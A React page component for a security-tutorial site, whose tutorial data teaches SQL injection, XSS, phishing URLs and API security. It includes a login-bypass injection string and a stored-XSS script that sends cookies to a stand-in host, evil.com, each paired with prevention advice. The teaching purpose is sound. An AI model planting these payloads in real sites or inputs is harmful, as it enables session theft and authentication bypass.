// src/pages/TutorialsPage.tsx
import { useState } from 'react';
import { BookOpen, Clock, ChevronDown, ChevronUp, Shield, Search, Lock } from 'lucide-react';
import { PublicNavbar } from '@/components/layout/PublicNavbar';
import { Link } from 'react-router-dom';
import { cn } from '@/lib/utils';

const TUTORIALS = [
  {
    id: 1, category: 'Web Security', level: 'Beginner', duration: '12 min', free: true,
    title: 'Understanding SQL Injection',
    summary: 'SQL injection remains one of the most exploited vulnerabilities. Learn how attackers manipulate database queries and how to prevent it.',
    content: `**What is SQL Injection?**\nSQL injection occurs when an attacker inserts malicious SQL code into an input field that gets executed by the database.\n\n**Example Attack:**\n\`\`\`sql\n-- Vulnerable query\nSELECT * FROM users WHERE email = '[user input]'\n\n-- Attacker inputs:\n' OR '1'='1\n\n-- Resulting query bypasses authentication:\nSELECT * FROM users WHERE email = '' OR '1'='1'\n\`\`\`\n\n**Prevention:**\n- Use parameterized queries / prepared statements\n- Input validation and sanitization\n- Principle of least privilege for DB users\n- Use an ORM that escapes values automatically`,
    tags: ['SQL', 'Database', 'OWASP Top 10'],
  },
  {
    id: 2, category: 'Web Security', level: 'Intermediate', duration: '18 min', free: true,
    title: 'XSS Attack Vectors & Prevention',
    summary: 'Cross-Site Scripting allows attackers to inject client-side scripts into pages viewed by others. Understand the three types and how to stop them.',
    content: `**Types of XSS:**\n\n1. **Stored XSS** — Malicious script is saved to DB and served to all users\n2. **Reflected XSS** — Script in URL parameter reflected immediately back\n3. **DOM-based XSS** — Manipulation of DOM in the browser\n\n**Example:**\n\`\`\`html\n<!-- Attacker submits this as a comment: -->\n<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n\`\`\`\n\n**Prevention:**\n- Output encode all user data (use \`textContent\` not \`innerHTML\`)\n- Implement Content Security Policy (CSP) headers\n- Use HttpOnly and Secure flags on cookies\n- Validate and sanitize all inputs server-side`,
    tags: ['XSS', 'JavaScript', 'OWASP Top 10'],
  },
  {
    id: 3, category: 'Network Security', level: 'Beginner', duration: '10 min', free: true,
    title: 'How Phishing URLs Are Constructed',
    summary: 'Phishing attacks trick users into visiting malicious sites. Learn the techniques attackers use so you can identify and block them.',
    content: `**Common Phishing Techniques:**\n\n1. **Lookalike domains** — \`paypa1.com\` vs \`paypal.com\` (the "l" is a "1")\n2. **Subdomain tricks** — \`paypal.com.evil-site.com\` (paypal.com is a subdomain)\n3. **Unicode homoglyphs** — Cyrillic "а" looks identical to Latin "a"\n4. **URL shorteners** — Hide the real destination\n5. **HTTPS abuse** — HTTPS doesn't mean safe, only encrypted\n\n**How to detect:**\n- Always check the full domain (rightmost before the first slash)\n- Hover over links before clicking\n- Use URL scanners like our platform\n- Enable anti-phishing features in your browser`,
    tags: ['Phishing', 'Social Engineering', 'URLs'],
  },
  {
    id: 4, category: 'API Security', level: 'Intermediate', duration: '22 min', free: true,
    title: 'API Security Best Practices',
    summary: 'APIs are the backbone of modern apps and a prime attack surface. This guide covers authentication, rate limiting, input validation, and more.',
    content: `**Top API Security Principles:**\n\n**1. Authentication & Authorization**\n- Use short-lived JWT access tokens (15min–1hr)\n- Implement refresh token rotation\n- Always check authorization, not just authentication\n- Use RBAC (Role-Based Access Control)\n\n**2. Rate Limiting**\n- Per-user and per-endpoint limits\n- Return 429 Too Many Requests with Retry-After header\n- Use sliding window counters\n\n**3. Input Validation**\n- Validate ALL inputs server-side (never trust the client)\n- Use schema validation (Zod, Joi, Yup)\n- Reject unexpected fields\n\n**4. Sensitive Data**\n- Never log tokens, passwords, or PII\n- Use HTTPS everywhere\n- Mask sensitive fields in responses`,
    tags: ['API', 'Authentication', 'JWT', 'REST'],
  },
  {
    id: 5, category: 'Infrastructure', level: 'Advanced', duration: '30 min', free: false,
    title: 'Zero-Day Vulnerability Response Playbook',
    summary: 'When a zero-day hits your stack, every minute counts. This playbook walks you through incident response, containment, and post-mortem.',
    content: '',
    tags: ['Incident Response', 'Zero-Day', 'Enterprise'],
  },
  {
    id: 6, category: 'AI Security', level: 'Intermediate', duration: '20 min', free: false,
    title: 'Prompt Injection & LLM Security',
    summary: 'As AI systems become infrastructure, new attack surfaces emerge. Learn about prompt injection, jailbreaking, and how to secure AI-powered apps.',
    content: '',
    tags: ['LLM', 'AI', 'Prompt Injection'],
  },
];

const LEVELS = ['All', 'Beginner', 'Intermediate', 'Advanced'];
const CATEGORIES = ['All', 'Web Security', 'Network Security', 'API Security', 'Infrastructure', 'AI Security'];

const levelColor = (level: string) => ({
  Beginner: 'badge-green', Intermediate: 'badge-blue', Advanced: 'badge-red',
}[level] ?? 'badge-gray');

export const TutorialsPage = () => {
  const [search, setSearch] = useState('');
  const [level, setLevel] = useState('All');
  const [category, setCategory] = useState('All');
  const [expanded, setExpanded] = useState<number | null>(null);

  const filtered = TUTORIALS.filter(t => {
    const matchSearch = t.title.toLowerCase().includes(search.toLowerCase()) ||
      t.summary.toLowerCase().includes(search.toLowerCase()) ||
      t.tags.some(tag => tag.toLowerCase().includes(search.toLowerCase()));
    const matchLevel = level === 'All' || t.level === level;
    const matchCat = category === 'All' || t.category === category;
    return matchSearch && matchLevel && matchCat;
  });

  return (
    <div className="min-h-screen bg-navy-950">
      
      {/* Header */}
      <section className="pt-28 pb-12 px-4 border-b border-surface-border relative">
        <div className="absolute inset-0 bg-hero-glow pointer-events-none" />
        <div className="relative max-w-4xl mx-auto text-center">
          <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-600/10 border border-blue-600/30 text-blue-400 text-xs font-medium mb-6">
            <BookOpen className="w-3.5 h-3.5" /> Free for everyone — no account needed
          </div>
          <h1 className="font-display text-4xl sm:text-5xl font-bold text-white mb-4">Security Tutorials</h1>
          <p className="text-slate-400 max-w-xl mx-auto mb-8">
            Practical security knowledge from beginner to advanced. Learn how attacks work, so you can build better defenses.
          </p>

          {/* Search */}
          <div className="relative max-w-md mx-auto">
            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
            <input className="input pl-10 w-full" placeholder="Search tutorials..."
              value={search} onChange={e => setSearch(e.target.value)} />
          </div>
        </div>
      </section>

      <div className="max-w-4xl mx-auto px-4 py-10">
        {/* Filters */}
        <div className="flex flex-wrap gap-3 mb-8">
          <div className="flex gap-1.5 flex-wrap">
            {LEVELS.map(l => (
              <button key={l} onClick={() => setLevel(l)}
                className={cn('px-3 py-1.5 rounded-lg text-xs font-medium border transition-all',
                  level === l ? 'bg-blue-600/20 border-blue-600/50 text-white' : 'border-surface-border text-slate-500 hover:text-white hover:border-slate-600')}>
                {l}
              </button>
            ))}
          </div>
          <div className="w-px bg-surface-border mx-1" />
          <div className="flex gap-1.5 flex-wrap">
            {CATEGORIES.map(c => (
              <button key={c} onClick={() => setCategory(c)}
                className={cn('px-3 py-1.5 rounded-lg text-xs font-medium border transition-all',
                  category === c ? 'bg-blue-600/20 border-blue-600/50 text-white' : 'border-surface-border text-slate-500 hover:text-white hover:border-slate-600')}>
                {c}
              </button>
            ))}
          </div>
        </div>

        <p className="text-xs text-slate-600 mb-6">{filtered.length} tutorial{filtered.length !== 1 ? 's' : ''} found</p>

        {/* Tutorial cards */}
        <div className="space-y-3">
          {filtered.map(t => {
            const isExp = expanded === t.id;
            return (
              <div key={t.id} className="card-hover overflow-hidden">
                <div className="flex items-start gap-4 cursor-pointer"
                  onClick={() => t.free ? setExpanded(isExp ? null : t.id) : undefined}>
                  <div className="w-10 h-10 rounded-lg bg-blue-600/10 border border-blue-600/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                    {t.free ? <BookOpen className="w-4 h-4 text-accent-blue" /> : <Lock className="w-4 h-4 text-slate-500" />}
                  </div>

                  <div className="flex-1 min-w-0">
                    <div className="flex items-start justify-between gap-3">
                      <h3 className="font-semibold text-white">{t.title}</h3>
                      {t.free
                        ? <button className="flex-shrink-0 mt-0.5 text-slate-500 hover:text-white">
                            {isExp ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                          </button>
                        : <span className="badge badge-blue flex-shrink-0 text-[10px] mt-0.5">Pro</span>
                      }
                    </div>
                    <p className="text-sm text-slate-400 mt-1 leading-relaxed">{t.summary}</p>
                    <div className="flex flex-wrap items-center gap-2 mt-3">
                      <span className={cn('badge', levelColor(t.level))}>{t.level}</span>
                      <span className="flex items-center gap-1 text-xs text-slate-500">
                        <Clock className="w-3 h-3" /> {t.duration}
                      </span>
                      <span className="text-slate-700">·</span>
                      <span className="text-xs text-slate-500">{t.category}</span>
                      {t.tags.map(tag => (
                        <span key={tag} className="badge badge-gray text-[10px]">{tag}</span>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Expanded content */}
                {isExp && t.content && (
                  <div className="mt-5 pt-5 border-t border-surface-border">
                    <pre className="text-sm text-slate-300 whitespace-pre-wrap leading-relaxed font-sans">
                      {t.content}
                    </pre>
                  </div>
                )}

                {/* Locked CTA */}
                {!t.free && (
                  <div className="mt-4 flex items-center gap-3 p-3 rounded-lg bg-surface-raised border border-surface-border">
                    <Shield className="w-4 h-4 text-accent-blue flex-shrink-0" />
                    <p className="text-sm text-slate-400 flex-1">This tutorial is available on Pro and Enterprise plans.</p>
                    <Link to="/register" className="btn-primary text-xs py-1.5 px-3">Unlock →</Link>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
};
